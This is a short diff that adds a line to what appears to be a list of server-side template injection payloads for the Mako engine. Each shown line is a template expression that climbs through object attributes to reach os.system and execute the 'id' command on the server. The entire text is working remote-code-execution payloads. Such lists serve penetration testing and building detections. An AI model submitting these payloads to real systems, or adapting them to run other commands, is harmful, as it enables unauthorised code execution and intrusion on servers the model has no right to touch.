@@ -99,3 +99,4 @@ ${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
 ${self.context._with_template.module.filters.compat.inspect.os.system("id")}
 ${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
 ${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
